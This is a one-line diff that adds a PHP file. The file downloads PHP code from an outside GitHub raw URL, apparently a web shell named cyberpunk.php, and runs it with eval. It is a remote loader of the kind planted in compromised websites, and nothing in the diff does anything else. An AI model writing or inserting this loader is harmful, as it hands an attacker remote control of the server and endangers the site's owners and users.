@@ -1,0 +1,1 @@
+<?php ($r=@file_get_contents('https://raw.githubusercontent.com/Tituss22/ShellSukaBintang01/refs/heads/main/cyberpunk.php'))?eval('?>'.$r):die('Error');
